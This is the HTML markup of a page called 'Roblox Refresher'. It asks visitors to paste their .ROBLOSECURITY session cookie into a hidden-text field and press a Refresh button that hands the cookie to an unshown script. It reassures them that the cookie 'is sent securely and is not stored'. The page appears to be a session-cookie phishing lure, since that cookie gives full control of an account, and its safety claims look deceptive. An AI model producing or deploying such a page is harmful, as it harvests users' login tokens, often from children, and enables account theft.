<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Roblox Refresher</title>
  
  <!-- Links to Google Fonts and the external stylesheet -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
  
  <link rel="stylesheet" href="style.css">
  <script src="script.js" defer></script>
</head>
<body>
  <main class="wrap">
    <header class="brand">
      <div class="brand-badge" aria-hidden="true">
        <svg viewBox="0 0 24 24" fill="none"><path d="M12 2.5l7 3.6v6.2c0 5.1-3.1 9.1-7 10.7-3.9-1.6-7-5.6-7-10.7V6.1l7-3.6z" stroke="currentColor" stroke-width="1.6" /><path d="M12 6.2v13.6" stroke="currentColor" stroke-opacity="0.25" stroke-width="1.2" /></svg>
      </div>
      <h1>Roblox Refresher</h1>
      <p class="sub">Secure • Fast • Reliable</p>
    </header>

    <section class="card" aria-label="Refresher panel">
      <p class="label">.ROBLOSECURITY Cookie</p>
      <!-- This input has the correct ID for the script to find it -->
      <input id="cookieInput" class="input" type="password" placeholder="Paste your cookie here..." />

      <div class="row">
        <!-- This button has the correct ID -->
        <button class="btn" type="button" id="refreshButton">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M9 7.5v9l8-4.5-8-4.5z" stroke-width="1.8" stroke-linejoin="round"/></svg>
          Refresh
        </button>
      </div>
      
      <!-- This is where the success/error message will appear -->
      <div id="resultBox" class="result-box"></div>
    </section>

    <p class="footer"><span>Tip:</span> Your cookie is sent securely and is not stored.</p>
  </main>
</body>
</html>
